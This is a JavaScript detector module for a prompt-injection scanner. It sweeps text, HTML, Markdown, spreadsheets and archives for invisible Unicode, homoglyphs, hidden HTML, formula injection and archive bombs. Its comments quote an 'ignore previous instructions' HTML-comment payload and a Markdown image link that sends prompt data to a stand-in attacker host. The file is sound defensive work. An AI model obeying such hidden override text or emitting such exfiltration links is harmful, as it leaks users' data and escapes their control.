/**
 * Main detector: orchestrates all detection categories.
 *
 * Integrated (Phase 2 + Phase 4 + S2 + S4):
 *   - invisibleUnicode  : invisible-unicode.js  (bidi-control sub-category exposed)
 *   - variationSelector : variation-selectors.js (M1, folded into invisibleUnicode)
 *   - mathBypass        : math-bypass.js        (M3, folded into homoglyphs)
 *   - combiningChars    : combining-chars.js    (S2, folded into invisibleUnicode —
 *                                                Zalgo / stacked-diacritic abuse)
 *   - markdownExfil     : markdown-exfil.js     (S4, folded into hiddenHtml —
 *                                                Markdown image URL data-exfil)
 *
 * Usage:
 *   const result = analyze(text, { fileType: "html"|"markdown"|"text", categories: [...] });
 */

import { detectInvisibleUnicode } from "./invisible-unicode.js";
import { detectControlChars } from "./control-chars.js";
import { detectHiddenElements } from "./hidden-elements.js";
import { detectMarkdownExfil } from "./markdown-exfil.js";
import {
  detectSuspiciousPatterns,
  scanShadowForSuspiciousPatterns,
} from "./suspicious-patterns.js";
import { detectHomoglyphs } from "./homoglyphs.js";
import { detectVariationSelectors } from "./variation-selectors.js";
import { detectMathBypass } from "./math-bypass.js";
import { detectCombiningChars } from "./combining-chars.js";
import {
  buildInvisibleStrippedShadow,
  buildNfkcShadow,
} from "./shadow-copy.js";
import { attachPriorities, buildTopFindings } from "./priority.js";
import { detectFormulaInjection } from "./formula-injection.js";

export const ALL_CATEGORIES = [
  "invisibleUnicode",
  "controlChars",
  "hiddenHtml",
  "suspiciousPatterns",
  "homoglyphs",
];

// File types that should trigger the HTML-comment / hidden-element checks.
// Markdown supports embedded HTML (including <!-- ... --> comments), so a
// .md / .mdc / .cursorrules file containing instruction-bearing comments needs
// the same hidden-element sweep as plain HTML. (QW5)
const HIDDEN_ELEMENT_FILETYPES = new Set(["html", "markdown"]);

/**
 * Analyze content for all threat categories.
 *
 * @param {string} content - Text to analyze
 * @param {Object} options
 * @param {string} [options.fileType] - "text" | "html" | "markdown" | "xlsx" | "csv" | "archive"
 * @param {string[]} [options.categories] - Limit to specific categories
 * @returns {Object} Findings grouped by category + summary
 *
 * S13: when `fileType === 'archive'` the parser layer is responsible for
 * recursive entry dispatch + emitting `summary.archive`. analyze() itself
 * just performs the standard 5-category sweep on the (usually empty) flat
 * text concatenation that the parser emits — bomb / zip-slip / depth / etc.
 * are merged in via `mergeFindings({ archive: ... })` at the parser layer.
 */
export function analyze(content, options = {}) {
  const {
    fileType = "text",
    categories = ALL_CATEGORIES,
  } = options;

  const findings = {
    invisibleUnicode: [],
    controlChars: [],
    hiddenHtml: [],
    suspiciousPatterns: [],
    homoglyphs: [],
  };

  const wanted = new Set(categories);

  if (wanted.has("invisibleUnicode")) {
    // Base invisible-unicode pass (Tags block, Bidi controls, PUA, etc.)
    const base = detectInvisibleUnicode(content);
    // M1: Variation Selector detection. Findings live under the same
    // invisibleUnicode bucket so the existing finding-schema (one array per
    // category) stays intact. Severity-based summary counting (below) keeps
    // info-level VS noise out of the warning/danger totals.
    const vs = detectVariationSelectors(content);
    // S2: Combining-mark stack detection (Zalgo). Same fold pattern as M1 —
    // findings live under invisibleUnicode so the existing finding-schema
    // (one array per category) stays intact. Severity-based summary counting
    // means single legitimate diacritics never escalate the warning total
    // (the detector itself suppresses depth < 8 by design).
    //
    // Note on shadow-copy interaction: we deliberately do NOT feed a
    // combining-stripped shadow into the suspicious-patterns scanner.
    // Stacked combiners on a Latin 'a' still leave the base 'a' intact, so
    // pattern hits like 'ignore' already match the original text directly —
    // adding another shadow would only inflate noise without new coverage.
    const cc = detectCombiningChars(content);
    findings.invisibleUnicode = base.concat(vs, cc);
  }
  if (wanted.has("controlChars")) {
    findings.controlChars = detectControlChars(content);
  }
  if (wanted.has("hiddenHtml") && HIDDEN_ELEMENT_FILETYPES.has(fileType)) {
    // QW5: Markdown documents can embed HTML, so we sweep them with the same
    // hidden-element detector (the HTML-comment branch in particular catches
    // <!-- ignore previous instructions --> style payloads inside .md files).
    //
    // S4: Markdown image URL exfiltration. ![alt](http://attacker/?prompt=...)
    // and the equivalent <img src="..."> form ride the same fileType gating
    // (html + markdown). Findings live under the same `hiddenHtml` bucket —
    // we do NOT introduce a new top-level byCategory key so baseline.test.js's
    // strict toEqual on `summary.byCategory` keeps working. R13 hard rule.
    const hidden = detectHiddenElements(content);
    const exfil = detectMarkdownExfil(content);
    findings.hiddenHtml = hidden.concat(exfil);
  }
  if (wanted.has("suspiciousPatterns")) {
    const direct = detectSuspiciousPatterns(content);

    // Shadow-copy pass: detect obfuscation-bypass variants (zero-width insertion
    // T1, math-alphanumeric S22, Tags-block, fullwidth, etc.) by scanning derived
    // views of the content with the same patterns. The original `content` is
    // never mutated and the shadows never leave detector.js — they are pure
    // detection scaffolding.
    const shadowFindings = [];
    const invStripped = buildInvisibleStrippedShadow(content);
    if (invStripped) {
      shadowFindings.push(
        ...scanShadowForSuspiciousPatterns(
          invStripped.shadow,
          invStripped.shadowToOrig,
          "invisibleStripped",
          content
        )
      );
    }
    const nfkc = buildNfkcShadow(content);
    if (nfkc) {
      shadowFindings.push(
        ...scanShadowForSuspiciousPatterns(
          nfkc.shadow,
          nfkc.shadowToOrig,
          "nfkcNormalized",
          content
        )
      );
    }

    findings.suspiciousPatterns = mergeShadowFindings(direct, shadowFindings);

    // S10: CSV/XLSX formula-injection fold. Findings carry
    // `category: 'formula-injection' | 'formula-prefix'` (item-level tag for
    // routing/scoring) but land in the existing suspiciousPatterns bucket so
    // the R13 5-key byCategory invariant is preserved. HIDDEN_ELEMENT_FILETYPES
    // is intentionally NOT extended — XLSX/CSV must NOT route through cheerio
    // (the parser emits pre-categorized extras instead).
    if (fileType === "xlsx" || fileType === "csv") {
      findings.suspiciousPatterns.push(
        ...detectFormulaInjection(content, fileType)
      );
    }
  }
  if (wanted.has("homoglyphs")) {
    // M3: Mathematical Alphanumeric bypass is a visual-mimicry attack — same
    // family as homoglyphs — so it shares the homoglyphs bucket. Severity-
    // based counting (below) prevents single-char "info" math hits from
    // inflating the warning total on legitimate scientific text.
    const homo = detectHomoglyphs(content);
    const math = detectMathBypass(content);
    findings.homoglyphs = homo.concat(math);
  }

  // S18: attach `priority` (0-100) to every finding BEFORE we hand the object
  // out. buildTopFindings then reads back those priorities to pick the banner.
  // Order matters - topFindings filter on priority, so priorities must exist
  // first.
  attachPriorities(findings, content.length);

  return {
    findings,
    summary: buildSummary(findings),
  };
}

/**
 * Merge direct + shadow suspicious-pattern findings with dedup.
 *
 * Dedup key: `${pattern}|${position}|${matchLen}`.
 *   - If a direct (non-shadow) finding already covers the same (pattern, span),
 *     drop the shadow finding (the direct hit is the canonical signal).
 *   - If two shadows produce the same (pattern, span), keep one finding and
 *     fold the second source into `shadowSource` as an array.
 *
 * Direct findings are preserved verbatim (no severity / shape changes), so the
 * existing baseline/attack tests stay green.
 */
function mergeShadowFindings(directFindings, shadowFindings) {
  const out = [...directFindings];
  const directKeys = new Set();
  for (const f of directFindings) {
    const len = (typeof f.matchLen === "number" && f.matchLen) ||
      (typeof f.matched === "string" && f.matched.length) || 1;
    directKeys.add(`${f.pattern}|${f.position}|${len}`);
  }

  const shadowIndex = new Map(); // key -> index into `out`
  for (const sf of shadowFindings) {
    const key = `${sf.pattern}|${sf.position}|${sf.matchLen}`;
    // Direct hit wins — skip the shadow finding entirely.
    if (directKeys.has(key)) continue;

    if (shadowIndex.has(key)) {
      // Already added by the other shadow — fold this source in.
      const existing = out[shadowIndex.get(key)];
      const sources = Array.isArray(existing.shadowSource)
        ? existing.shadowSource
        : [existing.shadowSource];
      if (!sources.includes(sf.shadowSource)) {
        sources.push(sf.shadowSource);
      }
      existing.shadowSource = sources;
      existing.type = `shadow:${sources.join("+")}`;
      continue;
    }
    out.push(sf);
    shadowIndex.set(key, out.length - 1);
  }
  return out;
}

/**
 * S20: Enrich findings with a `contextLocation` string (leaf-set + prefix).
 *
 * - `findings` is the analyze() `findings` object (category buckets of arrays)
 *   OR a flat array of finding-like objects (used for extraFindings buckets).
 * - `locationTags` is one or an array of `{ kind, index, label }` tags. The
 *   `label` field is what gets prefixed (e.g. "Page 3", "Slide 2", "Subject").
 * - If a finding already has `contextLocation`, we prepend `"<label> > <existing>"`.
 *   Otherwise we leaf-set `contextLocation = label`. Multiple tags are joined
 *   with `" > "` left-to-right (outer-most first).
 *
 * Pure function — returns a new object/array; never mutates input. Does NOT
 * touch `mergeFindings` or `buildSummary` (those run elsewhere in the pipeline).
 */
export function enrichFindingsLocation(findings, locationTags) {
  if (!findings) return findings;
  const tagsArr = Array.isArray(locationTags) ? locationTags : [locationTags];
  const labels = tagsArr
    .map((t) => (t && typeof t.label === "string" ? t.label : null))
    .filter((s) => s && s.length > 0);
  if (labels.length === 0) return findings;
  const prefix = labels.join(" > ");

  function enrichOne(item) {
    if (!item || typeof item !== "object") return item;
    if (typeof item.contextLocation === "string" && item.contextLocation.length > 0) {
      // Don't double-prefix if the existing string already starts with our prefix.
      if (item.contextLocation === prefix || item.contextLocation.startsWith(prefix + " > ")) {
        return item;
      }
      return { ...item, contextLocation: `${prefix} > ${item.contextLocation}` };
    }
    return { ...item, contextLocation: prefix };
  }

  if (Array.isArray(findings)) {
    return findings.map(enrichOne);
  }
  const out = {};
  for (const [k, v] of Object.entries(findings)) {
    out[k] = Array.isArray(v) ? v.map(enrichOne) : v;
  }
  return out;
}

/**
 * Merge additional findings (from file parsers) into a base result.
 *
 * S13: extended to merge across all 5 buckets (previously only `hiddenHtml`).
 * ZIP entries can emit findings of any category via recursive dispatchBuffer
 * (e.g. an XLSM inside a ZIP surfaces formula-injection in suspiciousPatterns,
 * an EML attachment surfaces invisibleUnicode etc.). The archive parser passes
 * those bucketed findings through `additional.{invisibleUnicode,...}` and the
 * archive structural summary through `additional.archive`. R13 stays intact:
 * the 5-bucket schema is preserved; only the sibling `summary.archive` key
 * (mirroring `bidiControl` / `topFindings`) is added.
 */
export function mergeFindings(baseResult, additional) {
  const add = additional || {};
  const merged = {
    findings: {
      invisibleUnicode: [
        ...baseResult.findings.invisibleUnicode,
        ...(add.invisibleUnicode || []),
      ],
      controlChars: [
        ...baseResult.findings.controlChars,
        ...(add.controlChars || []),
      ],
      hiddenHtml: [
        ...baseResult.findings.hiddenHtml,
        ...(add.hiddenHtml || []),
      ],
      suspiciousPatterns: [
        ...baseResult.findings.suspiciousPatterns,
        ...(add.suspiciousPatterns || []),
      ],
      homoglyphs: [
        ...baseResult.findings.homoglyphs,
        ...(add.homoglyphs || []),
      ],
    },
  };
  // S18: priorities are per-finding so re-attaching after a merge keeps the
  // new (concatenated) bucket consistent. We don't have access to the original
  // content length here (mergeFindings is called by file-parser tools with
  // additional findings appended), so pass the longer of the two sides as a
  // best-effort - it only affects the head-of-prompt boost and stays inside
  // the [0,100] clamp regardless.
  const contentLen =
    Math.max(
      (baseResult && baseResult.contentLength) || 0,
      (add && add.contentLength) || 0,
    ) || 2001; // > 2000 disables the head boost entirely (safe default)
  attachPriorities(merged.findings, contentLen);
  // S13: pre-existing archive summary on baseResult (when a nested parser
  // already accumulated one) merges with the additional archive summary so
  // recursive ZIP-in-ZIP counts roll up correctly.
  const archiveExtras = mergeArchiveSummaries(
    baseResult && baseResult.summary && baseResult.summary.archive,
    add.archive,
  );
  merged.summary = buildSummary(merged.findings, { archive: archiveExtras });
  return merged;
}

/**
 * S13: shape of `summary.archive`. Returned by `_emptyArchiveSummary()` and
 * accumulated via `mergeArchiveSummaries()`. Parsers populate it; detector
 * never invents archive findings on its own.
 *
 *   {
 *     scanned: number,              // # archives walked at this level + nested
 *     bomb: number,                 // AR-01 hits (ratio block / total cap)
 *     depth: number,                // AR-02 hits (nest depth cap)
 *     protected: number,            // AR-04 hits (encrypted entry / archive)
 *     entryCap: number,             // AR-07 hits (entry-count cap)
 *     maxRatio: number,             // peak compression ratio observed
 *     maxDepth: number,             // deepest recursion reached
 *     totalEntries: number,         // sum of entries enumerated
 *     totalUncompressedBytes: number,
 *     skippedEntries: number,       // entries skipped due to per-entry cap
 *   }
 */
function _emptyArchiveSummary() {
  return {
    scanned: 0,
    bomb: 0,
    depth: 0,
    protected: 0,
    entryCap: 0,
    maxRatio: 0,
    maxDepth: 0,
    totalEntries: 0,
    totalUncompressedBytes: 0,
    skippedEntries: 0,
  };
}

function mergeArchiveSummaries(a, b) {
  if (!a && !b) return null;
  const out = _emptyArchiveSummary();
  const sources = [a, b].filter(Boolean);
  for (const s of sources) {
    out.scanned += s.scanned || 0;
    out.bomb += s.bomb || 0;
    out.depth += s.depth || 0;
    out.protected += s.protected || 0;
    out.entryCap += s.entryCap || 0;
    out.totalEntries += s.totalEntries || 0;
    out.totalUncompressedBytes += s.totalUncompressedBytes || 0;
    out.skippedEntries += s.skippedEntries || 0;
    if ((s.maxRatio || 0) > out.maxRatio) out.maxRatio = s.maxRatio || 0;
    if ((s.maxDepth || 0) > out.maxDepth) out.maxDepth = s.maxDepth || 0;
  }
  return out;
}

/**
 * Count items in `arr` whose `.severity` matches `sev`.
 * Items without an explicit severity are treated as `defaultSev` so existing
 * detectors that pre-date the severity field continue to count as before.
 */
function countBySeverity(arr, sev, defaultSev = null) {
  let n = 0;
  for (const f of arr) {
    const s = f.severity || defaultSev;
    if (s === sev) n++;
  }
  return n;
}

function buildSummary(findings, extras = {}) {
  // Severity-based counting everywhere so VS / Math `info` findings (legit
  // emoji / IVS / single math char) never inflate the warning total.
  const totalDanger =
    countBySeverity(findings.invisibleUnicode, "danger") +
    countBySeverity(findings.hiddenHtml, "danger") +
    // suspicious-patterns historically had no `severity` field on every entry;
    // its findings are always treated as danger, matching legacy behavior.
    countBySeverity(findings.suspiciousPatterns, "danger", "danger") +
    countBySeverity(findings.homoglyphs, "danger");

  const totalWarning =
    countBySeverity(findings.invisibleUnicode, "warning") +
    countBySeverity(findings.controlChars, "warning", "warning") +
    countBySeverity(findings.hiddenHtml, "warning") +
    // S5: suspicious-patterns.json now carries an optional `severity` field
    // ("warning" for generic conversation-format markers like `Human:` /
    // `### Instruction`). Default severity remains "danger", so this addition
    // doesn't change counts for any pre-S5 pattern.
    countBySeverity(findings.suspiciousPatterns, "warning") +
    countBySeverity(findings.homoglyphs, "warning", "warning");

  const total = totalDanger + totalWarning;

  let status;
  if (totalDanger > 0) status = "danger";
  else if (totalWarning > 0) status = "warning";
  else status = "safe";

  // M2: surface the bidi-control breakdown as its own sub-summary. We do NOT
  // add a new top-level key to `byCategory` because baseline.test.js pins that
  // object with `toEqual` (strict shape). Putting the breakdown on a sibling
  // key keeps the existing schema intact while still letting downstream UIs
  // show Trojan-Source / over-use stats separately from the generic
  // invisibleUnicode count.
  const bidiBreakdown = summarizeBidi(findings.invisibleUnicode);

  return {
    status,
    total,
    dangerCount: totalDanger,
    warningCount: totalWarning,
    // S12: severity breakdown as a sibling key — mirrors dangerCount/warningCount
    // in an object shape so consumers can do `summary.bySeverity.danger` without
    // touching the top-level counts. Safe to add: not part of byCategory (the
    // R13 5-key invariant pinned by baseline.test.js stays intact), and the
    // documented summary contract in s12-final-spec.json references this exact
    // path (`bySeverity.danger` / `bySeverity.warning`).
    bySeverity: {
      danger: totalDanger,
      warning: totalWarning,
    },
    byCategory: {
      invisibleUnicode: findings.invisibleUnicode.length,
      controlChars: findings.controlChars.length,
      hiddenHtml: findings.hiddenHtml.length,
      suspiciousPatterns: findings.suspiciousPatterns.length,
      homoglyphs: findings.homoglyphs.length,
    },
    bidiControl: bidiBreakdown,
    // S18: top-priority findings (up to 5, severity >= warning, per-category
    // cap = 2). Added as a SIBLING key to byCategory / bidiControl - we do
    // NOT add a new key to byCategory (baseline.test.js pins that shape with
    // strict toEqual; R13).
    topFindings: buildTopFindings(findings, 5),
    // S13: archive structural summary (bomb / depth / protected / entryCap +
    // aggregate counters). Sibling key — does NOT touch byCategory. Only
    // populated when a parser passes an archive payload through mergeFindings;
    // for plain text / HTML / Markdown analyze() calls this is omitted entirely
    // so the v1.7.0 summary shape is unchanged for non-archive callers (R13
    // baseline.test.js stays green without rewrites).
    ...(extras && extras.archive ? { archive: extras.archive } : {}),
  };
}

/**
 * Build the bidi-control sub-summary from the invisibleUnicode bucket.
 *
 * Looks at entries tagged `category: "bidi-control"` (set by
 * invisible-unicode.js after the Phase 4 refactor) and counts them by `kind`
 * (override / embedding / isolate) and by severity. `total: 0` is returned
 * when no bidi findings are present so consumers can safely read every field.
 */
function summarizeBidi(invisibleFindings) {
  const out = {
    total: 0,
    override: 0,
    embedding: 0,
    isolate: 0,
    danger: 0,
    warning: 0,
  };
  for (const f of invisibleFindings) {
    if (f.category !== "bidi-control") continue;
    out.total++;
    if (f.kind === "override") out.override++;
    else if (f.kind === "embedding") out.embedding++;
    else if (f.kind === "isolate") out.isolate++;
    if (f.severity === "danger") out.danger++;
    else if (f.severity === "warning") out.warning++;
  }
  return out;
}

/**
 * Format a scan result as a plain-text report (for clipboard / logs).
 */
export function formatReport(result, meta = {}) {
  const { fileName = "(unknown)", scannedAt = new Date().toISOString() } = meta;
  const { findings, summary } = result;
  const lines = [
    "=== Shield Scanner Report ===",
    `File: ${fileName}`,
    `Date: ${scannedAt}`,
    `Status: ${summary.status.toUpperCase()}`,
    `Total findings: ${summary.total} (danger: ${summary.dangerCount}, warning: ${summary.warningCount})`,
    "",
  ];

  const categoryLabels = [
    ["Invisible Unicode", "invisibleUnicode"],
    ["Control Characters", "controlChars"],
    ["Hidden HTML", "hiddenHtml"],
    ["Suspicious Patterns", "suspiciousPatterns"],
    ["Homoglyphs", "homoglyphs"],
  ];

  for (const [label, key] of categoryLabels) {
    const items = findings[key];
    lines.push(`[${label}] ${items.length} found`);
    for (const item of items) {
      if (item.char) {
        lines.push(`  - ${item.name || item.type || ""} ${item.char} at pos ${item.position}`);
      } else if (item.pattern) {
        lines.push(`  - ${item.pattern}: ${item.matched}`);
      } else if (item.technique) {
        lines.push(`  - ${item.technique} in <${item.element}>`);
      } else if (item.original) {
        lines.push(
          `  - ${item.original} -> ${item.replacement} at pos ${item.position}`
        );
      } else if (item.normalized) {
        // Math-bypass finding: show the "looks like" rendering.
        lines.push(
          `  - ${item.type || "mathAlphanumeric"} ${item.codePoint} ~ "${item.normalized}" at pos ${item.position}`
        );
      } else if (item.type === "combiningStack") {
        // S2: combining-mark stack (Zalgo). Same layout family as M1/M3:
        // a single line per run, mention base + stack depth so readers can
        // gauge the severity without unfolding the whole context window.
        const baseLabel =
          item.baseCodePoint === null
            ? "(no base)"
            : `U+${item.baseCodePoint
                .toString(16)
                .toUpperCase()
                .padStart(item.baseCodePoint > 0xffff ? 5 : 4, "0")}`;
        lines.push(
          `  - combiningStack depth=${item.stackDepth} on ${baseLabel} at pos ${item.position}`
        );
      }
    }
    lines.push("");
  }

  if (summary.bidiControl && summary.bidiControl.total > 0) {
    lines.push(
      `[Bidi-Control breakdown] total=${summary.bidiControl.total} ` +
        `override=${summary.bidiControl.override} ` +
        `embedding=${summary.bidiControl.embedding} ` +
        `isolate=${summary.bidiControl.isolate} ` +
        `(danger=${summary.bidiControl.danger}, warning=${summary.bidiControl.warning})`
    );
    lines.push("");
  }

  // S13: archive structural breakdown — only printed when the parser layer
  // populated summary.archive. Mirrors the bidiControl block above.
  if (summary.archive && summary.archive.scanned > 0) {
    const a = summary.archive;
    const ratioStr = a.maxRatio === Infinity ? "inf" : a.maxRatio.toFixed(1);
    lines.push(
      `[Archive breakdown] scanned=${a.scanned} ` +
        `entries=${a.totalEntries} ` +
        `bomb=${a.bomb} depth=${a.depth} protected=${a.protected} ` +
        `entryCap=${a.entryCap} skipped=${a.skippedEntries} ` +
        `maxRatio=${ratioStr} maxDepth=${a.maxDepth}`
    );
    lines.push("");
  }

  return lines.join("\n");
}
